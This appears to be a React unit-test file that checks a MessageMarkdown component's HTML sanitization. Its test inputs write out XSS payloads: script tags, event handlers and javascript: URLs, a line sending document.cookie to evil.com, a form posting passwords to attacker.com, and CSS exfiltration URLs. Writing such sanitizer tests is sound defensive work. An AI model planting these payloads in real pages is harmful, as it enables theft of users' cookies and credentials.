/**
 * MessageMarkdown Security Tests
 *
 * This test suite validates that the MessageMarkdown component properly
 * sanitizes malicious HTML content and prevents XSS attacks while
 * preserving safe formatting.
 */

import { render } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import MessageMarkdown from "@/components/messageMarkdown";

describe("MessageMarkdown Security Protection", () => {
  describe("Script Injection Prevention", () => {
    it("should remove script tags completely", () => {
      const maliciousInput = `
        <script>alert('XSS Attack!');</script>
        <p>Safe content</p>
      `;

      const { container } = render(<MessageMarkdown>{maliciousInput}</MessageMarkdown>);

      // Script tag should be completely removed
      expect(container.querySelector("script")).toBeNull();

      // Safe content should remain
      expect(container.querySelector("p")).toBeTruthy();
      expect(container.textContent).toContain("Safe content");
      expect(container.textContent).not.toContain("alert");
    });

    it("should remove inline script content", () => {
      const maliciousInput = `
        <div>
          <script>
            fetch('/api/admin/delete', {method: 'POST'});
            document.location = 'http://evil.com?cookie=' + document.cookie;
          </script>
          Normal text
        </div>
      `;

      const { container } = render(<MessageMarkdown>{maliciousInput}</MessageMarkdown>);

      expect(container.querySelector("script")).toBeNull();
      expect(container.textContent).not.toContain("fetch");
      expect(container.textContent).not.toContain("document.location");
      expect(container.textContent).toContain("Normal text");
    });
  });

  describe("Event Handler Prevention", () => {
    it("should remove all event handlers from elements", () => {
      const maliciousInput = `
        <img src="x" onerror="alert('XSS')" alt="test">
        <button onclick="fetch('/api/admin/reset')">Click me</button>
        <div onmouseover="steal_data()">Hover here</div>
      `;

      const { container } = render(<MessageMarkdown>{maliciousInput}</MessageMarkdown>);

      const img = container.querySelector("img");
      const button = container.querySelector("button");
      const div = container.querySelector("div");

      // Elements should exist but without event handlers
      expect(img).toBeTruthy();
      expect(button).toBeTruthy();
      expect(div).toBeTruthy();

      // Event handlers should be removed
      expect(img?.getAttribute("onerror")).toBeNull();
      expect(button?.getAttribute("onclick")).toBeNull();
      expect(div?.getAttribute("onmouseover")).toBeNull();

      // Safe attributes should remain
      expect(img?.getAttribute("src")).toBe("x");
      expect(img?.getAttribute("alt")).toBe("test");
    });

    it("should handle multiple event types", () => {
      const maliciousInput = `
        <div 
          onclick="evil()" 
          onload="hack()" 
          onmouseover="steal()"
          onfocus="xss()"
          onblur="attack()"
        >
          Content
        </div>
      `;

      const { container } = render(<MessageMarkdown>{maliciousInput}</MessageMarkdown>);

      const div = container.querySelector("div");
      expect(div).toBeTruthy();

      // All event handlers should be removed
      const eventHandlers = ["onclick", "onload", "onmouseover", "onfocus", "onblur"];

      eventHandlers.forEach((handler) => {
        expect(div?.getAttribute(handler)).toBeNull();
      });

      expect(div?.textContent?.trim()).toBe("Content");
    });
  });

  describe("Form Hijacking Prevention", () => {
    it("should remove form elements completely", () => {
      const maliciousInput = `
        <form action="http://attacker.com/steal" method="POST">
          <label>Password:</label>
          <input type="password" name="password">
          <button type="submit">Submit</button>
        </form>
        <p>Safe content after form</p>
      `;

      const { container } = render(<MessageMarkdown>{maliciousInput}</MessageMarkdown>);

      // Form elements should be completely removed
      expect(container.querySelector("form")).toBeNull();
      expect(container.querySelector("input")).toBeNull();
      expect(container.querySelector("button")).toBeNull();
      expect(container.querySelector("label")).toBeNull();

      // Safe content should remain
      expect(container.querySelector("p")).toBeTruthy();
      expect(container.textContent).toContain("Safe content after form");

      // Text content from removed elements might remain
      expect(container.textContent).toContain("Password:");
      expect(container.textContent).toContain("Submit");
    });
  });

  describe("CSS-based Attack Prevention", () => {
    it("should remove style tags completely", () => {
      const maliciousInput = `
        <style>
          body { background: url('http://evil.com/track?data=' + document.cookie); }
          .malicious::before { content: url('http://attacker.com/steal'); }
        </style>
        <div class="malicious">Styled content</div>
      `;

      const { container } = render(<MessageMarkdown>{maliciousInput}</MessageMarkdown>);

      // Style tag should be removed
      expect(container.querySelector("style")).toBeNull();

      // Div should remain but without dangerous styling
      const div = container.querySelector("div");
      expect(div).toBeTruthy();
      expect(div?.textContent).toContain("Styled content");

      // No CSS injection should be present
      expect(container.innerHTML).not.toContain("evil.com");
      expect(container.innerHTML).not.toContain("document.cookie");
    });
  });

  describe("iframe and Embed Prevention", () => {
    it("should remove iframe elements completely", () => {
      const maliciousInput = `
        <iframe src="javascript:alert('XSS')"></iframe>
        <iframe src="http://malicious-site.com/keylogger.html"></iframe>
        <iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>
        <p>Content after iframes</p>
      `;

      const { container } = render(<MessageMarkdown>{maliciousInput}</MessageMarkdown>);

      // All iframes should be removed
      expect(container.querySelectorAll("iframe")).toHaveLength(0);

      // Safe content should remain
      expect(container.querySelector("p")).toBeTruthy();
      expect(container.textContent).toContain("Content after iframes");
    });

    it("should remove embed and object elements", () => {
      const maliciousInput = `
        <embed src="javascript:alert('XSS')">
        <object data="http://evil.com/malware.swf">
          <param name="movie" value="javascript:hack()">
        </object>
        <p>Safe content</p>
      `;

      const { container } = render(<MessageMarkdown>{maliciousInput}</MessageMarkdown>);

      expect(container.querySelector("embed")).toBeNull();
      expect(container.querySelector("object")).toBeNull();
      expect(container.querySelector("param")).toBeNull();

      expect(container.querySelector("p")).toBeTruthy();
      expect(container.textContent).toContain("Safe content");
    });
  });

  describe("JavaScript URL Prevention", () => {
    it("should remove dangerous URL schemes", () => {
      const maliciousInput = `
        <a href="javascript:alert('XSS')">JS Link</a>
        <a href="data:text/html,<script>alert('XSS')</script>">Data Link</a>
        <a href="vbscript:msgbox('XSS')">VBS Link</a>
        <a href="https://safe-site.com">Safe Link</a>
      `;

      const { container } = render(<MessageMarkdown>{maliciousInput}</MessageMarkdown>);

      const links = container.querySelectorAll("a");

      // All links should exist but dangerous hrefs should be removed
      expect(links).toHaveLength(4);

      // Check each link
      const linkTexts = Array.from(links).map((link) => link.textContent);
      expect(linkTexts).toContain("JS Link");
      expect(linkTexts).toContain("Data Link");
      expect(linkTexts).toContain("VBS Link");
      expect(linkTexts).toContain("Safe Link");

      // Dangerous href attributes should be removed or sanitized
      const hrefs = Array.from(links).map((link) => link.getAttribute("href"));
      expect(hrefs).not.toContain("javascript:alert('XSS')");
      expect(hrefs.some((href) => href?.includes("safe-site.com"))).toBeTruthy();
    });
  });

  describe("Safe Content Preservation", () => {
    it("should preserve legitimate HTML formatting", () => {
      const safeInput = `
        <h2>Customer Support Message</h2>
        <p>Hello <strong>John Doe</strong>,</p>
        <p>Thank you for contacting us. Here are the details:</p>
        <ul>
          <li>Order ID: <code>#12345</code></li>
          <li>Status: <em>Processing</em></li>
        </ul>
        <p>Visit: <a href="https://example.com">https://example.com</a></p>
      `;

      const { container } = render(<MessageMarkdown>{safeInput}</MessageMarkdown>);

      // All safe elements should be preserved
      expect(container.querySelector("h2")).toBeTruthy();
      expect(container.querySelector("p")).toBeTruthy();
      expect(container.querySelector("strong")).toBeTruthy();
      expect(container.querySelector("ul")).toBeTruthy();
      expect(container.querySelector("li")).toBeTruthy();
      expect(container.querySelector("code")).toBeTruthy();
      expect(container.querySelector("em")).toBeTruthy();
      expect(container.querySelector("a")).toBeTruthy();

      // Content should be preserved
      expect(container.textContent).toContain("Customer Support Message");
      expect(container.textContent).toContain("John Doe");
      expect(container.textContent).toContain("#12345");
      expect(container.textContent).toContain("Processing");

      // Safe link should work
      const link = container.querySelector("a");
      expect(link?.getAttribute("href")).toBe("https://example.com");
    });

    it("should handle mixed safe and unsafe content", () => {
      const mixedInput = `
        <h1>Title</h1>
        <script>alert('evil');</script>
        <p>Safe paragraph with <strong>bold text</strong></p>
        <img src="image.jpg" onerror="hack()" alt="Safe image">
        <ul>
          <li>List item 1</li>
          <li onclick="evil()">List item 2</li>
        </ul>
      `;

      const { container } = render(<MessageMarkdown>{mixedInput}</MessageMarkdown>);

      // Safe elements should remain
      expect(container.querySelector("h1")).toBeTruthy();
      expect(container.querySelector("p")).toBeTruthy();
      expect(container.querySelector("strong")).toBeTruthy();
      expect(container.querySelector("img")).toBeTruthy();
      expect(container.querySelector("ul")).toBeTruthy();
      expect(container.querySelectorAll("li")).toHaveLength(2);

      // Dangerous elements/attributes should be removed
      expect(container.querySelector("script")).toBeNull();
      expect(container.querySelector("img")?.getAttribute("onerror")).toBeNull();
      expect(container.querySelectorAll("li")[1]?.getAttribute("onclick")).toBeNull();

      // Safe attributes should remain
      expect(container.querySelector("img")?.getAttribute("src")).toBe("image.jpg");
      expect(container.querySelector("img")?.getAttribute("alt")).toBe("Safe image");

      // Safe content should be preserved
      expect(container.textContent).toContain("Title");
      expect(container.textContent).toContain("Safe paragraph");
      expect(container.textContent).toContain("bold text");
      expect(container.textContent).toContain("List item 1");
      expect(container.textContent).toContain("List item 2");

      // Malicious content should be removed
      expect(container.textContent).not.toContain("alert");
      expect(container.textContent).not.toContain("hack");
      expect(container.textContent).not.toContain("evil");
    });
  });

  describe("allowHtml Configuration", () => {
    it("should remove all HTML when allowHtml is false", () => {
      const htmlInput = `
        <h1>Title</h1>
        <p>Paragraph with <strong>bold</strong> and <em>italic</em></p>
        <script>alert('XSS');</script>
      `;

      const { container } = render(<MessageMarkdown allowHtml={false}>{htmlInput}</MessageMarkdown>);

      // No HTML elements should remain when allowHtml is false
      expect(container.querySelector("h1")).toBeNull();
      expect(container.querySelector("p")).toBeNull();
      expect(container.querySelector("strong")).toBeNull();
      expect(container.querySelector("em")).toBeNull();
      expect(container.querySelector("script")).toBeNull();

      // Only text content should remain
      expect(container.textContent).toContain("Title");
      expect(container.textContent).toContain("Paragraph");
      expect(container.textContent).toContain("bold");
      expect(container.textContent).toContain("italic");
      expect(container.textContent).not.toContain("alert");
    });

    it("should sanitize HTML when allowHtml is true (default)", () => {
      const htmlInput = `
        <h1>Title</h1>
        <p>Safe paragraph</p>
        <script>alert('XSS');</script>
      `;

      const { container } = render(<MessageMarkdown allowHtml={true}>{htmlInput}</MessageMarkdown>);

      // Safe HTML should remain
      expect(container.querySelector("h1")).toBeTruthy();
      expect(container.querySelector("p")).toBeTruthy();

      // Dangerous HTML should be removed
      expect(container.querySelector("script")).toBeNull();

      expect(container.textContent).toContain("Title");
      expect(container.textContent).toContain("Safe paragraph");
      expect(container.textContent).not.toContain("alert");
    });
  });
});
